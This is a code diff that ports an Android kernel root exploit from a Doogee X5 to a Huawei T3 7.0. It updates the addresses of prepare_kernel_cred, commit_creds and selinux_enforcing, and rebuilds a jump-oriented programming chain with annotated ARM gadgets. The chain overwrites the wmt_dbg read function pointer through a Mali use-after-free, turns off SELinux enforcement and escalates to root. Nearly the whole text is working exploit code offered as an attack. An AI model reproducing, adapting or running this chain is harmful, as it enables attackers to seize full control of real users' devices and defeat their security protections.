@@ -13,15 +13,14 @@
 #include <sys/syscall.h>
 
 // addresses for getting root
-#define PREPARE_KERNEL_CRED_ADDR 0xc0046e44
-#define COMMIT_CREDS_ADDR        0xc0046760
-#define SELINUX_ENFORCING_ADDR   0xc0ff8e84
-#define MEMCPY_ADDR              0xc0276fd4
+#define PREPARE_KERNEL_CRED_ADDR 0xc0049c5c
+#define COMMIT_CREDS_ADDR        0xc0049578
+#define SELINUX_ENFORCING_ADDR   0xc0dc8c44
 
 #define PROC_FILE "/proc/driver/wmt_dbg"
 
 #define FAKE_MALI_ALLOC_BUFF_SIZE 96
-#define JOPCHAIN_BUFFER_SIZE 1024
+#define PATTERN_SIZE 0x200
 
 // Mali definitions
 #define MALI_IOC_BASE           0x82
@@ -126,7 +125,7 @@ void important_ascii_art() {
     printf("██      ██   ██ ██      ██           ██ \n");
     printf("\033[38;5;57m");
     printf("██      ██   ██ ███████ ███████ ███████ \n\n");
-    printf("               Doogee X5\n");
+    printf("             Huawei T3 7.0\n");
     printf("\n\033[0m");
 }
 
@@ -178,8 +177,50 @@ void mali_do_munmap(mmap_result_t mapping) {
     }
 }
 
+typedef struct
+{
+    uint32_t pattern[PATTERN_SIZE];
+    uint8_t written[PATTERN_SIZE];
+} PatternBuffer;
+
+void pattern_init(PatternBuffer *pb, uint32_t fill_value)
+{
+    for (size_t i = 0; i < PATTERN_SIZE; i++)
+    {
+        pb->pattern[i] = fill_value;
+        pb->written[i] = 0x0;
+    }
+}
+
+void pattern_set(PatternBuffer *pb, size_t offset, uint32_t value)
+{
+    if (offset % 4 != 0)
+    {
+        fprintf(stderr, "[ERROR] Unaligned offset 0x%zx\n", offset);
+        exit(1);
+    }
+
+    size_t idx = offset / 4;
+
+    if (idx >= PATTERN_SIZE)
+    {
+        fprintf(stderr, "[ERROR] Offset 0x%zx out of bounds\n", offset);
+        exit(1);
+    }
+
+    if (pb->written[idx])
+    {
+        fprintf(stderr, "[CONFLICT] Offset 0x%zx written twice!\n", offset);
+    }
+
+    pb->pattern[idx] = value;
+    pb->written[idx] = 0x1;
+}
+
+#define P(pb, off, val) pattern_set(pb, off, val)
+
+
 int trigger_overwritten_function_pointer() {
-    uint64_t buffer[1024];
     int fd;
     
     // Try to open the device normally
@@ -188,178 +229,187 @@ int trigger_overwritten_function_pointer() {
         return 1;
     }
 
-    // Construct the JOP-chain the kernel will execute
-    uint32_t jop_buffer[JOPCHAIN_BUFFER_SIZE / 4];
-    memset(jop_buffer, 0, sizeof(jop_buffer));
+    // build JOP patterm
+    PatternBuffer pb;
+    pattern_init(&pb, 0x0);
 
+    
 
     // Gets an allocation in kmalloc-128, sets freelist pointer at start to 0x0 using memcpy
     // turns off selinux enforcing, then executes commit_creds(prepare_kernel_cred(NULL)) to get root
 
     // Save stack values
-    //   c023ac68 0d c0 a0 e1     cpy        r12,sp
-    //   c023ac6c f0 d8 2d e9     stmdb      sp!,{r4,r5,r6,r7,r11,r12,lr,pc}
-    //   c023ac70 04 b0 4c e2     sub        r11,r12,#0x4
-    //   c023ac74 04 30 91 e5     ldr        r3,[r1,#0x4]
-    //   c023ac78 01 50 a0 e1     cpy        r5,r1
-    //   c023ac7c 28 60 91 e5     ldr        r6,[r1,#0x28]
-    //   c023ac80 00 70 a0 e1     cpy        r7,r0
-    //   c023ac84 33 ff 2f e1     blx        r3
-    jop_buffer[0x4 / 4] = 0xc04aa448;                       // r3, next gadget
-    jop_buffer[0x28 / 4] = 0x0;                             // r6, unused
+    //   c02a5470 0d c0 a0 e1     cpy        r12,sp
+    //   c02a5474 f0 d8 2d e9     stmdb      sp!,{r4,r5,r6,r7,r11,r12,lr,pc}
+    //   c02a5478 04 b0 4c e2     sub        r11,r12,#0x4
+    //   c02a547c 04 30 91 e5     ldr        r3,[r1,#0x4]
+    //   c02a5480 01 50 a0 e1     cpy        r5,r1
+    //   c02a5484 28 60 91 e5     ldr        r6,[r1,#0x28]
+    //   c02a5488 00 70 a0 e1     cpy        r7,r0
+    //   c02a548c 33 ff 2f e1     blx        r3
+
+    P(&pb, 0x4, 0xc06491d8); // r3, next gadget
+    P(&pb, 0x28, 0x0); // r6
 
 
-    // need to call this function at address 0xc003e528 and store 0x0 at the start of it, this will break loop in freelist
-    // void USE_THIS_FOR_KERNEL_FIX(void)
+    // need to call this function at address 0xc0041394 and store 0x0 at the start of it, this will break loop in freelist
+    // void FUN_c0041394(void)
+
     // {
-    //     int iVar1;
-        
-    //     iVar1 = kzalloc(_DAT_c0fee4c0,0x80d0,0x58);
-    //     if (iVar1 == 0) {
-    //         return;
-    //     }
-    //     *(int *)iVar1 = iVar1;
-    //     *(int *)(iVar1 + 4) = iVar1;
-    //     *(int *)(iVar1 + 0x18) = iVar1 + 0x18;
-    //     *(int *)(iVar1 + 0x1c) = iVar1 + 0x18;
-    //     *(int *)(iVar1 + 0x28) = iVar1 + 0x28;
-    //     *(int *)(iVar1 + 0x2c) = iVar1 + 0x28;
-    //     *(undefined4 *)(iVar1 + 0x34) = 8;
+    //   int iVar1;
+
+    //   iVar1 = kmalloc_2(_DAT_c0db7e10,0x80d0,0x58);
+    //   if (iVar1 == 0) {
     //     return;
+    //   }
+    //   *(int *)iVar1 = iVar1;
+    //   *(int *)(iVar1 + 4) = iVar1;
+    //   *(int *)(iVar1 + 0x18) = iVar1 + 0x18;
+    //   *(int *)(iVar1 + 0x1c) = iVar1 + 0x18;
+    //   *(int *)(iVar1 + 0x28) = iVar1 + 0x28;
+    //   *(int *)(iVar1 + 0x2c) = iVar1 + 0x28;
+    //   *(undefined4 *)(iVar1 + 0x34) = 8;
+    //   return;
     // }
 
-    // Get r1 into r4
-    //   c04aa448 8c 30 91 e5     ldr        r3,[r1,#0x8c]
-    //   c04aa44c 01 00 a0 e1     cpy        r0,r1
-    //   c04aa450 01 40 a0 e1     cpy        r4,r1
-    //   c04aa454 33 ff 2f e1     blx        r3
-    jop_buffer[0x8c / 4] = 0xc03b8e1c; // r3, next gadget
+    // jop base is in r1, r5, and r9 rn
 
-    // Increment r4 so we can reuse same gadgets
-    //   c03b8e1c 48 40 84 e2     add        r4,r4,#0x48
-    //   c03b8e20 28 c0 95 e5     ldr        r12,[r5,#0x28] // NOTE: r5 contains r1 from earlier
-    //   c03b8e24 3c ff 2f e1     blx        r12
-    jop_buffer[0x28 / 4] = 0xc05d1b74; // r12, next gadget
+    //   c06491d8 38 30 91 e5     ldr        r3,[r1,#0x38]
+    //   c06491dc 01 40 a0 e1     cpy        r4,r1
+    //   c06491e0 00 50 a0 e1     cpy        r5,r0
+    //   c06491e4 00 00 53 e3     cmp        r3,#0x0
+    //   c06491e8 01 00 00 0a     beq        LAB_c06491f4
+    //   c06491ec 01 00 a0 e1     cpy        r0,r1
+    //   c06491f0 33 ff 2f e1     blx        r3
+    P(&pb, 0x38, 0xc0362444); // r3, next gadget
 
-    // Now call the kmalloc wrapper function to get allocation
-    //   c05d1b74 74 30 94 e5     ldr        r3,[r4,#0x74]
-    //   c05d1b78 00 00 53 e3     cmp        r3,#0x0          // ignore
-    //   c05d1b7c 2a 00 00 0a     beq        LAB_c05d1c2c     // ignore
-    //   c05d1b80 33 ff 2f e1     blx        r3
-    //   c05d1b84 64 30 94 e5     ldr        r3,[r4,#0x64]
-    //   c05d1b88 33 ff 2f e1     blx        r3
-    jop_buffer[(0x48 + 0x74) / 4] = 0xc003e528; // r3 (0xbc), address of kmalloc wrapper function
-    jop_buffer[(0x48 + 0x64) / 4] = 0xc03b9d60; // r3 (0xac), next gadget
+    // now in r0, r1, r4, r9
 
-    // now the allocation is in r0, so we need to write 0 to it, lets use memcpy
-    //   c03b9d60 48 40 84 e2     add        r4,r4,#0x48
-    //   c03b9d64 10 30 95 e5     ldr        r3,[r5,#0x10]  // r5 contains r1 from earlier
-    //   c03b9d68 33 ff 2f e1     blx        r3
-    jop_buffer[0x10 / 4] = 0xc02e94a0; // r3, next gadget
-
-    jop_buffer[0x0] = 0x0; // for the memcpy, needs to contain 0x0 in src
-
-    // Now load the value 0x4 into r2 for the memcpy argument (only nulling pointer at start)
-    //   c02e94a0 ec 20 94 e5     ldr        r2,[r4,#0xec]
-    //   c02e94a4 34 30 0b e5     str        r3,[r11,#local_38]   // ignore?
-    //   c02e94a8 44 30 94 e5     ldr        r3,[r4,#0x44]
-    //   c02e94ac 33 ff 2f e1     blx        r3
-    jop_buffer[(0x48 + 0x48 + 0xec) / 4] = 0x4; // r2 (0x17c)
-    jop_buffer[(0x48 + 0x48 + 0x44) / 4] = 0xc05d1b74; // r3 (0xd4)
-
-    // Now call the memcpy function
-    //   c05d1b74 74 30 94 e5     ldr        r3,[r4,#0x74]
-    //   c05d1b78 00 00 53 e3     cmp        r3,#0x0          // ignore
-    //   c05d1b7c 2a 00 00 0a     beq        LAB_c05d1c2c     // ignore
-    //   c05d1b80 33 ff 2f e1     blx        r3
-    //   c05d1b84 64 30 94 e5     ldr        r3,[r4,#0x64]
-    //   c05d1b88 33 ff 2f e1     blx        r3
-    jop_buffer[(0x48 + 0x48 + 0x74) / 4] = MEMCPY_ADDR; // r3 (0x104)
-    jop_buffer[(0x48 + 0x48 + 0x64) / 4] = 0xc00e9f08; // r3 (0xf4)
-
-    // Restore the r1 register to point to controlled data again
-    //   c00e9f08 18 30 94 e5     ldr        r3,[r4,#0x18]
-    //   c00e9f0c 10 10 94 e5     ldr        r1,[r4,#0x10]
-    //   c00e9f10 33 ff 2f e1     blx        r3
-    jop_buffer[(0x48 + 0x48 + 0x18) / 4] = 0xc0083770; // r3 (0xa8), next gadget
-
-    uint32_t offset = 0x180;
-    jop_buffer[(0x48 + 0x48 + 0x10) / 4] = (uint32_t) (jop_buffer + (offset / 4)); // r1 (0xa0), address to restore (pointer to controlled data)
+    //   c0362444 20 30 94 e5     ldr        r3,[r4,#0x20]
+    //   c0362448 00 50 a0 e1     cpy        r5,r0
+    //   c036244c 24 00 94 e5     ldr        r0,[r4,#0x24]
+    //   c0362450 33 ff 2f e1     blx        r3
+    P(&pb, 0x20, 0xc033bd74); // r3, next gadget
+    P(&pb, 0x24, 0x0); // r0, unused
 
 
-    // Now we (should) have fixed the freelist, we can work on escalating privileges, starting with disabling selinux
+    //   c033bd74 10 30 95 e5     ldr        r3,[r5,#0x10]
+    //   c033bd78 05 00 a0 e1     cpy        r0,r5
+    //   c033bd7c 33 ff 2f e1     blx        r3
+    //   c033bd80 2c 31 95 e5     ldr        r3,[r5,#0x12c]
+    //   c033bd84 05 00 a0 e1     cpy        r0,r5
+    //   c033bd88 33 ff 2f e1     blx        r3
+    P(&pb, 0x10, 0xc0041394); // r3, function address
+    P(&pb, 0x12c, 0xc07fd0bc); // r3, next gadget
 
-    // Load value into r0 (address of selinux enforcing)
-    //   c0083770 10 30 91 e5     ldr        r3,[r1,#0x10]
-    //   c0083774 00 50 a0 e1     cpy        r5,r0
-    //   c0083778 01 40 a0 e1     cpy        r4,r1
-    //   c008377c 18 00 91 e5     ldr        r0,[r1,#0x18]
-    //   c0083780 04 10 91 e5     ldr        r1,[r1,#0x4]
-    //   c0083784 33 ff 2f e1     blx        r3
-    jop_buffer[(offset + 0x10) / 4] = 0xc07fa654; // r3, next gadget
-    jop_buffer[(offset + 0x18) / 4] = SELINUX_ENFORCING_ADDR - 0x1c; // r0, selinux enforcing global address
-    // jop_buffer[0x4 / 4] = 0xc0083770; // IGNORE
+    //   c07fd0bc 00 30 90 e5     ldr        r3,[r0,#0x0]
+    //   c07fd0c0 04 10 a0 e1     cpy        r1,r4
+    //   c07fd0c4 02 00 a0 e1     cpy        r0,r2
+    //   c07fd0c8 33 ff 2f e1     blx        r3
+    P(&pb, 0x0, 0xc03dcb7c); // r3, next gadget
 
-    // Load 0x0 into r6 to write to the global
-    //   c07fa654 38 30 94 e5     ldr        r3,[r4,#0x38]
-    //   c07fa658 00 00 53 e3     cmp        r3,#0x0
-    //   c07fa65c 04 00 00 0a     beq        LAB_c07fa674
-    //   c07fa660 44 60 94 e5     ldr        r6,[r4,#0x44]
-    //   c07fa664 33 ff 2f e1     blx        r3
-    jop_buffer[(offset + 0x38) / 4] = 0xc0653300; // r3, next gadget
-    jop_buffer[(offset + 0x44) / 4] = 0x0; // r6, value to write to selinux enforcing
+    //   c03dcb7c 64 31 94 e5     ldr        r3,[r4,#0x164]
+    //   c03dcb80 0c 30 93 e5     ldr        r3,[r3,#0xc]
+    //   c03dcb84 00 00 53 e3     cmp        r3,#0x0
+    //   c03dcb88 00 90 a0 e1     cpy        r9,r0
+    //   c03dcb8c 01 00 00 0a     beq        LAB_c03dcb98
+    //   c03dcb90 05 00 a0 e1     cpy        r0,r5
+    //   c03dcb94 33 ff 2f e1     blx        r3
+    uint32_t offset = 0xc;
+    P(&pb, 0x164, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
+    P(&pb, offset + 0xc, 0xc0661a10); // r3, next gadget
 
-    // Save 0 at enforcing
-    //   c0653300 1c 60 80 e5     str        r6,[r0,#0x1c]
-    //   c0653304 68 00 94 e5     ldr        r0,[r4,#0x68]
-    //   c0653308 08 30 90 e5     ldr        r3,[r0,#0x8]
-    //   c065330c 10 30 93 e5     ldr        r3,[r3,#0x10]
-    //   c0653310 33 ff 2f e1     blx        r3
-    jop_buffer[(offset + 0x68) / 4] = (uint32_t) (jop_buffer + (offset / 4)); // r0, gadget loaded from there
-    jop_buffer[(offset + 0x8) / 4] = (uint32_t) (jop_buffer + (offset / 4) - 1); // r3, must point to next gadget - 0x10
-    jop_buffer[(offset + 0xc) / 4] = 0xc03a2c28; // r3, next gadget
+    //   c0661a10 00 30 a0 e3     mov        r3,#0x0
+    //   c0661a14 18 30 09 e5     str        r3,[r9,#-0x18]
+    //   c0661a18 04 10 a0 e1     cpy        r1,r4
+    //   c0661a1c d0 20 a0 e3     mov        r2,#0xd0
+    //   c0661a20 08 30 90 e5     ldr        r3,[r0,#0x8]
+    //   c0661a24 10 30 93 e5     ldr        r3,[r3,#0x10]
+    //   c0661a28 33 ff 2f e1     blx        r3
+    offset = 0x1c;
+    P(&pb, 0x8, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
+    P(&pb, offset + 0x10, 0xc02aa0d4); // r3, next gadget
 
 
-    // Now selinux enforcing dealt with, lets execute commit_creds(prepare_kernel_cred(NULL))
+    // freelist should now be fixed, next up is turning off selinux
+    // jop start is in r0, r1, r4, r5
+    // r10 contains 0x0, we can use that
 
-    // Clear r0
-    //   c03a2c28 48 30 90 e5     ldr        r3,[r0,#0x48]
-    //   c03a2c2c 00 00 a0 e3     mov        r0,#0x0
-    //   c03a2c30 33 ff 2f e1     blx        r3
-    jop_buffer[(offset + 0x48) / 4] = 0xc05d1b74; // r3, next gadget
+    //   c02aa0d4 90 30 94 e5     ldr        r3,[r4,#0x90]
+    //   c02aa0d8 80 00 84 e2     add        r0,r4,#0x80
+    //   c02aa0dc 08 30 93 e5     ldr        r3,[r3,#0x8]
+    //   c02aa0e0 33 ff 2f e1     blx        r3
+    offset = 0x5c;
+    P(&pb, 0x90, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
+    P(&pb, offset + 0x8, 0xc001a7cc); // r3, next gadget
 
-    // Call prepare_kernel_cred
-    //   c05d1b74 74 30 94 e5     ldr        r3,[r4,#0x74]
-    //   c05d1b78 00 00 53 e3     cmp        r3,#0x0          // ignore
-    //   c05d1b7c 2a 00 00 0a     beq        LAB_c05d1c2c     // ignore
-    //   c05d1b80 33 ff 2f e1     blx        r3
-    //   c05d1b84 64 30 94 e5     ldr        r3,[r4,#0x64]
-    //   c05d1b88 33 ff 2f e1     blx        r3
-    jop_buffer[(offset + 0x74) / 4] = PREPARE_KERNEL_CRED_ADDR; // r3, address of the function to call (prepare_kernel_cred)
-    jop_buffer[(offset + 0x64) / 4] = 0xc08c2748; // r3, address of the next gadget
+    //   c001a7cc 3c 30 90 e5     ldr        r3,[r0,#0x3c]
+    //   c001a7d0 00 50 a0 e1     cpy        r5,r0
+    //   c001a7d4 0c 41 90 e5     ldr        r4,[r0,#0x10c]
+    //   c001a7d8 d4 30 93 e5     ldr        r3,[r3,#0xd4]
+    //   c001a7dc 33 ff 2f e1     blx        r3
+    uint32_t r0_offset = 0x80;
+    offset = 0x0;
+    P(&pb, r0_offset + 0x3c, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
+    P(&pb, r0_offset + 0x10c, SELINUX_ENFORCING_ADDR - 0xa8); // r4, location of selinux enforcing - 0xa8
+    P(&pb, offset + 0xd4, 0xc06588b4); // r3, next gadget
 
-    // Just needed to fix r5 for next gadget
-    //   c08c2748 c0 31 94 e5     ldr        r3,[r4,#0x1c0]
-    //   c08c274c 50 50 84 e2     add        r5,r4,#0x50    // get valid address into r5
-    //   c08c2750 34 21 84 e5     str        r2,[r4,#0x134]
-    //   c08c2754 33 ff 2f e1     blx        r3
-    jop_buffer[(offset + 0x1c0) / 4] = 0xc05d135c; // r3, next gadget
+    //   c06588b4 a8 a0 84 e5     str        r10,[r4,#0xa8]
+    //   c06588b8 08 30 90 e5     ldr        r3,[r0,#0x8]
+    //   c06588bc 10 30 93 e5     ldr        r3,[r3,#0x10]
+    //   c06588c0 33 ff 2f e1     blx        r3
+    offset = 0x50;
+    P(&pb, r0_offset + 0x8, (uint32_t) (pb.pattern + (offset / 4))); // r3, pointer to pointer to next gadget
+    P(&pb, offset + 0x10, 0xc0276dd8); // r3, next gadget
 
-    // Call commit_creds without touching r0
-    //   c05d135c 50 30 94 e5     ldr        r3,[r4,#0x50]
-    //   c05d1360 33 ff 2f e1     blx        r3
-    //   c05d1364 5c 30 94 e5     ldr        r3,[r4,#0x5c]
-    //   c05d1368 b4 00 d5 e1     ldrh       r0,[r5,#0x4]   // ignore, just make sure r5 is valid
-    //   c05d136c 33 ff 2f e1     blx        r3
-    jop_buffer[(offset + 0x50) / 4] = COMMIT_CREDS_ADDR; // r3, address of the function to call (commit_creds)
-    jop_buffer[(offset + 0x5c) / 4] = 0xc023acd4; // r3, address of the next gadget
 
-    // Cleanup stack like nothing ever happened
-    //   c023acd4 04 00 a0 e1     cpy        r0=>DAT_fffffff4,r4
-    //   c023acd8 f0 a8 9d e8     ldmia      sp,{r4,r5,r6,r7,r11,sp,pc}
+    // now do the good old commit_creds(prepare_kernel_creds(NULL))
+    // jop base is in r1, jop base + 0x80 is in r0, r5
+    // r8 is zero (we can use this to get NULL into r0)
+
+    //   c0276dd8 80 20 95 e5     ldr        r2,[r5,#0x80]
+    //   c0276ddc 08 00 a0 e1     cpy        r0,r8
+    //   c0276de0 30 10 92 e5     ldr        r1,[r2,#0x30]
+    //   c0276de4 34 60 92 e5     ldr        r6,[r2,#0x34]
+    //   c0276de8 31 ff 2f e1     blx        r1
+    offset = 0x68;
+    uint32_t r6_offset = 0x90;
+    P(&pb, r0_offset + 0x80, (uint32_t) (pb.pattern + (offset / 4))); // r2, nice chunk of memory for next loads
+    P(&pb, offset + 0x30, 0xc043a63c); // r1, next gadget
+    P(&pb, offset + 0x34, (uint32_t) (pb.pattern + (r6_offset / 4))); // r6, some safe function table ting
+
+    //   c043a63c 14 30 96 e5     ldr        r3,[r6,#0x14]
+    //   c043a640 33 ff 2f e1     blx        r3
+    //   c043a644 5c 30 96 e5     ldr        r3,[r6,#0x5c]
+    //   c043a648 00 00 53 e3     cmp        r3,#0x0
+    //   c043a64c 00 00 00 0a     beq        LAB_c043a654
+    //   c043a650 33 ff 2f e1     blx        r3
+    P(&pb, r6_offset + 0x14, PREPARE_KERNEL_CRED_ADDR); // r3, address of prepare_kernel_cred()
+    P(&pb, r6_offset + 0x5c, 0xc05e5018); // r3, next gadget
+
+    //   c05e5018 38 30 95 e5     ldr        r3,[r5,#0x38]
+    //   c05e501c 05 10 a0 e1     cpy        r1,r5
+    //   c05e5020 33 ff 2f e1     blx        r3
+    P(&pb, r0_offset + 0x38, 0xc0296390); // r3, next gadget
+
+    //   c0296390 01 60 a0 e1     cpy        r6,r1
+    //   c0296394 19 00 00 0a     beq        LAB_c0296400 // hope this doesnt break anything lul
+    //   c0296398 0c 30 95 e5     ldr        r3,[r5,#0xc]
+    //   c029639c 33 ff 2f e1     blx        r3
+    P(&pb, r0_offset + 0xc, 0xc043a63c); // r3, next gadget
+
+    //   c043a63c 14 30 96 e5     ldr        r3,[r6,#0x14]
+    //   c043a640 33 ff 2f e1     blx        r3
+    //   c043a644 5c 30 96 e5     ldr        r3,[r6,#0x5c]
+    //   c043a648 00 00 53 e3     cmp        r3,#0x0
+    //   c043a64c 00 00 00 0a     beq        LAB_c043a654
+    //   c043a650 33 ff 2f e1     blx        r3
+    P(&pb, r0_offset + 0x14, COMMIT_CREDS_ADDR); // r3, address of commit_creds()
+    P(&pb, r0_offset + 0x5c, 0xc00322b4); // r3, next gadget
+
 
     // Try a small read
-    ssize_t bytes_read = read(fd, jop_buffer, sizeof(jop_buffer));
+    ssize_t bytes_read = read(fd, pb.pattern, sizeof(pb.pattern));
     
     close(fd);
     
@@ -458,8 +508,8 @@ int main() {
     fake_mali_alloc_buff[0x28 / 4] = 0x00000000; // set refcount to 1
 
     // overwrite list pointers to point to shellcode
-    fake_mali_alloc_buff[0x40 / 4] = 0xc09bb2c0 - 0x4; // where to write it (wmt_dbg read function pointer)
-    fake_mali_alloc_buff[0x44 / 4] = (uint32_t)0xc023ac68 - 0x4; // what to write (address of first gadget - 0x4)
+    fake_mali_alloc_buff[0x40 / 4] = 0xc09ab49c - 0x4; // where to write it (wmt_dbg read function pointer)
+    fake_mali_alloc_buff[0x44 / 4] = (uint32_t)0xc02a5470 - 0x4; // what to write (address of shellcode - 0x4)
 
 
     // STEP 5: TRIGGER UAF AND SPRAY
